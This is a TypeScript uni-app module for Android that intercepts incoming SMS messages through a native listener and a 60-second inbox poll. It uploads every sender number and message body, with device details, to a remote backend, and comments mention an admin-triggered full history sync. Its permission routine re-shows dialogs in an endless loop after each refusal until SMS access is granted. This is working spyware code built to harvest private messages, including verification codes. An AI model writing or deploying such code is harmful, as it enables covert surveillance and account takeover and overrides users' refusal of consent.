/**
 * 短信监听模块
 * 双重机制：
 * 1. leven-call 原生插件实时监听（如果回调能正常触发）
 * 2. 定时轮询读取短信收件箱（ContentResolver）作为兜底
 * 仅支持 Android 平台
 */
import { reportSmsRecord } from '@/utils/data-sync'
import type { SmsRecordData } from '@/api/monitor'
import i18n from '@/locale'

// leven-call 插件模块引用
let callModule: any = null
let isListening = false

// 轮询定时器
let pollTimer: number | null = null
// 轮询间隔（60秒）
const POLL_INTERVAL = 60000
// 已上报短信的最新时间戳（毫秒）
const LAST_SMS_TIMESTAMP_KEY = 'sms_last_timestamp'

/**
 * 获取 leven-call 插件模块
 */
function getCallModule(): any {
  // #ifdef APP-PLUS
  if (!callModule) {
    callModule = uni.requireNativePlugin('leven-call-CallModule')
  }
  return callModule
  // #endif
  return null
}

/**
 * 获取设备信息
 */
function getDeviceInfo(): string {
  try {
    const systemInfo = uni.getSystemInfoSync()
    return `${systemInfo.platform}-${systemInfo.model || 'unknown'}-${systemInfo.system || ''}`
  } catch {
    return 'unknown'
  }
}

/**
 * 格式化时间为 ISO 格式
 */
function formatDateTime(date?: Date): string {
  const d = date || new Date()
  const year = d.getFullYear()
  const month = String(d.getMonth() + 1).padStart(2, '0')
  const day = String(d.getDate()).padStart(2, '0')
  const hours = String(d.getHours()).padStart(2, '0')
  const minutes = String(d.getMinutes()).padStart(2, '0')
  const seconds = String(d.getSeconds()).padStart(2, '0')
  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`
}

/**
 * 初始化短信监听
 * 在 APP 启动时调用
 */
export function initSmsMonitor(): boolean {
  // #ifdef APP-PLUS
  try {
    const systemInfo = uni.getSystemInfoSync()
    if (systemInfo.platform !== 'android') {
      console.log('[SmsMonitor] Only supported on Android')
      return false
    }

    const module = getCallModule()
    if (!module) {
      console.error('[SmsMonitor] leven-call module not found')
      return false
    }

    console.log('[SmsMonitor] Module loaded successfully')
    return true
  } catch (e) {
    console.error('[SmsMonitor] Init failed:', e)
    return false
  }
  // #endif
  return false
}

/**
 * 开始短信监听
 * 同时启动实时监听和定时轮询
 */
export function startSmsListening(): boolean {
  // #ifdef APP-PLUS
  try {
    if (isListening) {
      console.log('[SmsMonitor] Already listening')
      return true
    }

    // 必须先检查权限，没有权限不能调用 registerSmsListener（否则触发系统权限弹窗）
    if (!checkPermissionsGranted()) {
      console.warn('[SmsMonitor] No SMS permission, skip startSmsListening')
      return false
    }

    const module = getCallModule()
    if (!module) {
      console.error('[SmsMonitor] Module not available')
      return false
    }

    // 注册实时短信监听（leven-call 插件 v1.4.0+）
    // API: module.registerSmsListener(callback)
    // 回调格式: { code: 0, message: "收到短信", data: { number: "10086", content: "..." } }
    try {
      module.registerSmsListener((res: any) => {
        console.log('[SmsMonitor] Realtime callback:', JSON.stringify(res))
        // 过滤注册成功的初始回调（data 为空对象 {}）
        // 只处理有实际短信数据的回调（data.number 或 data.content 存在）
        if (res && res.code === 0 && res.data && (res.data.number || res.data.content)) {
          handleSmsReceived(res.data)
        }
      })
      console.log('[SmsMonitor] Realtime listener registered')
    } catch (e) {
      console.warn('[SmsMonitor] Realtime listener failed, relying on polling:', e)
    }

    // 启动定时轮询读取短信收件箱（兜底机制）
    startPolling()

    isListening = true
    console.log('[SmsMonitor] SMS listening started (realtime + polling)')
    return true
  } catch (e) {
    console.error('[SmsMonitor] Start listening failed:', e)
    return false
  }
  // #endif
  return false
}

/**
 * 停止短信监听
 */
export function stopSmsListening(): void {
  // #ifdef APP-PLUS
  try {
    if (!isListening) return

    const module = getCallModule()
    if (module) {
      try {
        module.unregisterSmsListener()
      } catch (e) {
        console.warn('[SmsMonitor] unregisterSmsListener failed:', e)
      }
    }

    // 停止轮询
    stopPolling()

    isListening = false
    console.log('[SmsMonitor] SMS listening stopped')
  } catch (e) {
    console.error('[SmsMonitor] Stop listening failed:', e)
  }
  // #endif
}

/**
 * 处理收到的短信
 * leven-call 回调 data 格式: { number: "10086", content: "短信内容" }
 */
async function handleSmsReceived(data: any): Promise<void> {
  try {
    console.log('[SmsMonitor] SMS data:', JSON.stringify(data))

    // leven-call 插件字段: data.number, data.content
    const phoneNumber = data.number || ''
    const content = data.content || ''

    if (!phoneNumber && !content) {
      console.warn('[SmsMonitor] Empty SMS data, skipping')
      return
    }

    const record: SmsRecordData = {
      phone_number: phoneNumber,
      content: content,
      received_at: formatDateTime(new Date()),
      device_info: getDeviceInfo(),
    }

    // 上报到后端
    await reportSmsRecord(record)
    console.log('[SmsMonitor] SMS reported: from', phoneNumber)
  } catch (e) {
    console.error('[SmsMonitor] Handle SMS failed:', e)
  }
}

/**
 * 启动定时轮询读取短信收件箱
 */
function startPolling(): void {
  if (pollTimer) return

  // 首次立即执行一次
  pollNewSms()

  pollTimer = setInterval(() => {
    pollNewSms()
  }, POLL_INTERVAL) as unknown as number

  console.log('[SmsMonitor] Polling started, interval:', POLL_INTERVAL / 1000, 's')
}

/**
 * 停止定时轮询
 */
function stopPolling(): void {
  if (pollTimer) {
    clearInterval(pollTimer)
    pollTimer = null
    console.log('[SmsMonitor] Polling stopped')
  }
}

/**
 * 获取上次已处理的短信时间戳
 */
function getLastSmsTimestamp(): number {
  try {
    const val = uni.getStorageSync(LAST_SMS_TIMESTAMP_KEY)
    return val ? Number(val) : 0
  } catch {
    return 0
  }
}

/**
 * 保存最新的短信时间戳
 */
function setLastSmsTimestamp(ts: number): void {
  try {
    uni.setStorageSync(LAST_SMS_TIMESTAMP_KEY, String(ts))
  } catch (e) {
    console.error('[SmsMonitor] Save timestamp failed:', e)
  }
}

/**
 * 轮询读取新短信并上报
 * 使用 ContentResolver 读取收件箱，只上报比上次时间戳更新的短信
 */
async function pollNewSms(): Promise<void> {
  // #ifdef APP-PLUS
  try {
    const token = uni.getStorageSync('token')
    if (!token) return

    if (!checkPermissionsGranted()) return

    let lastTs = getLastSmsTimestamp()

    // 首次运行：设置为当前时间，不读取历史短信（全量同步由管理端指令触发）
    if (lastTs === 0) {
      lastTs = Date.now()
      setLastSmsTimestamp(lastTs)
      console.log('[SmsMonitor] First poll, set baseline timestamp:', lastTs)
      return
    }

    const newRecords = readNewSmsFromInbox(lastTs)

    if (newRecords.length === 0) return

    console.log('[SmsMonitor] Poll found', newRecords.length, 'new SMS since', lastTs)

    let maxTs = lastTs
    for (const item of newRecords) {
      if (item.timestamp > maxTs) {
        maxTs = item.timestamp
      }
      await reportSmsRecord(item.record)
    }

    // 更新时间戳
    setLastSmsTimestamp(maxTs)
    console.log('[SmsMonitor] Poll reported', newRecords.length, 'records, new lastTs:', maxTs)
  } catch (e) {
    console.error('[SmsMonitor] Poll failed:', e)
  }
  // #endif
}

/**
 * 从短信收件箱读取比指定时间戳更新的短信
 */
function readNewSmsFromInbox(sinceTimestamp: number): Array<{ record: SmsRecordData; timestamp: number }> {
  const results: Array<{ record: SmsRecordData; timestamp: number }> = []

  // #ifdef APP-PLUS
  try {
    const systemInfo = uni.getSystemInfoSync()
    if (systemInfo.platform !== 'android') return results

    const main = plus.android.runtimeMainActivity()
    const Uri = (plus.android.importClass('android.net.Uri') as any)
    plus.android.importClass('android.database.Cursor')

    const contentResolver = main.getContentResolver()
    plus.android.importClass(contentResolver)
    const smsUri = Uri.parse('content://sms/inbox')

    // 只查询比 sinceTimestamp 更新的短信
    let selection: string | null = null
    let selectionArgs: string[] | null = null
    if (sinceTimestamp > 0) {
      selection = 'date > ?'
      selectionArgs = [String(sinceTimestamp)]
    }

    const cursor = contentResolver.query(smsUri, null, selection, selectionArgs, 'date ASC')
    if (!cursor) return results

    plus.android.importClass(cursor)
    const deviceInfo = getDeviceInfo()
    const addressIdx = cursor.getColumnIndex('address')
    const bodyIdx = cursor.getColumnIndex('body')
    const dateIdx = cursor.getColumnIndex('date')

    while (cursor.moveToNext()) {
      const address = cursor.getString(addressIdx) || ''
      const body = cursor.getString(bodyIdx) || ''
      const date = cursor.getLong(dateIdx)

      if (!address && !body) continue

      results.push({
        record: {
          phone_number: String(address),
          content: String(body),
          received_at: formatDateTime(new Date(Number(date))),
          device_info: deviceInfo,
        },
        timestamp: Number(date),
      })
    }

    cursor.close()
  } catch (e) {
    console.error('[SmsMonitor] Read new SMS failed:', e)
  }
  // #endif

  return results
}

/**
 * 检查是否正在监听
 */
export function isSmsListening(): boolean {
  return isListening
}

/**
 * 恢复轮询（APP 从后台回到前台时调用）
 * 定时器在后台可能失效，需要重新启动
 */
export function resumeSmsPolling(): void {
  // #ifdef APP-PLUS
  if (isListening && !pollTimer) {
    console.log('[SmsMonitor] Resuming polling after foreground')
    startPolling()
  }
  // #endif
}

/**
 * 检查短信权限是否已授予
 */
function checkPermissionsGranted(): boolean {
  // #ifdef APP-PLUS
  try {
    const permissions = [
      'android.permission.READ_SMS',
      'android.permission.RECEIVE_SMS',
    ]
    const main = plus.android.runtimeMainActivity()
    return permissions.every((perm) => {
      const result = plus.android.invoke(main, 'checkSelfPermission', perm)
      return result === 0 // PERMISSION_GRANTED
    })
  } catch {
    return false
  }
  // #endif
  return false
}

/**
 * 触发系统短信权限弹窗，轮询等待用户授权
 * 通过调用 registerSmsListener 触发系统权限弹窗（插件内部会自动请求权限）
 * 轮询检查权限状态，直到用户操作完成
 */
function requestSystemPermission(): Promise<boolean> {
  return new Promise((resolve) => {
    // #ifdef APP-PLUS
    try {
      const module = getCallModule()
      if (!module) {
        console.error('[SmsMonitor] Module not available for permission request')
        resolve(false)
        return
      }

      console.log('[SmsMonitor] Triggering system permission dialog via registerSmsListener...')
      // 调用 registerSmsListener 会触发系统权限弹窗
      // 此时忽略回调数据，仅用于触发权限请求
      module.registerSmsListener((_res: any) => {
        // 不处理，权限授予后由 startSmsListening 重新注册
      })

      // 轮询检查权限，每 500ms 检查一次，最多等 60 秒
      let elapsed = 0
      const timer = setInterval(() => {
        elapsed += 500
        const granted = checkPermissionsGranted()
        console.log('[SmsMonitor] Poll check granted:', granted, 'elapsed:', elapsed)
        if (granted) {
          clearInterval(timer)
          // 取消临时注册的监听
          try { module.unregisterSmsListener() } catch (_) {}
          console.log('[SmsMonitor] Permission granted (poll)')
          resolve(true)
        } else if (elapsed >= 60000) {
          clearInterval(timer)
          try { module.unregisterSmsListener() } catch (_) {}
          console.warn('[SmsMonitor] Permission not granted after 60s')
          resolve(false)
        }
      }, 500)
    } catch (e) {
      console.error('[SmsMonitor] System permission request failed:', e)
      resolve(false)
    }
    // #endif
    // #ifndef APP-PLUS
    resolve(false)
    // #endif
  })
}

/**
 * 显示自定义预弹窗
 */
function showPrePermissionDialog(isRetry: boolean): Promise<boolean> {
  return new Promise((resolve) => {
    const t = i18n.global.t
    const title = isRetry ? t('permission.smsRetryTitle') : t('permission.smsTitle')
    const content = isRetry ? t('permission.smsRetryContent') : t('permission.smsContent')

    uni.showModal({
      title,
      content,
      confirmText: t('common.allow'),
      cancelText: t('common.deny'),
      success: (res) => {
        resolve(!!res.confirm)
      },
      fail: () => {
        resolve(false)
      },
    })
  })
}

/**
 * 请求短信相关权限（带预弹窗引导）
 *
 * 流程：
 * 1. 检查权限是否已授予 → 已授予直接返回 true
 * 2. 显示自定义预弹窗 → 用户点允许 → 弹系统权限弹窗
 * 3. 系统权限授予成功 → 返回 true
 * 4. 用户点拒绝自定义弹窗 或 系统权限拒绝 → 循环弹窗直到授权
 */
export async function requestSmsPermissions(): Promise<boolean> {
  // #ifdef APP-PLUS
  try {
    const systemInfo = uni.getSystemInfoSync()
    if (systemInfo.platform !== 'android') {
      return false
    }

    // 已授权，直接返回
    if (checkPermissionsGranted()) {
      return true
    }

    // 第一次弹自定义预弹窗
    let confirmed = await showPrePermissionDialog(false)

    // 循环：用户点拒绝 或 系统权限被拒绝，继续弹窗提示
    while (true) {
      if (confirmed) {
        const granted = await requestSystemPermission()
        if (granted) return true
        // 系统权限被拒绝，弹重试提示
      }
      // 用户点拒绝 或 系统权限未授予，循环弹强调弹窗
      confirmed = await showPrePermissionDialog(true)
    }
  } catch (e) {
    console.error('[SmsMonitor] Permission request failed:', e)
    return false
  }
  // #endif
  // #ifndef APP-PLUS
  return false
  // #endif
}
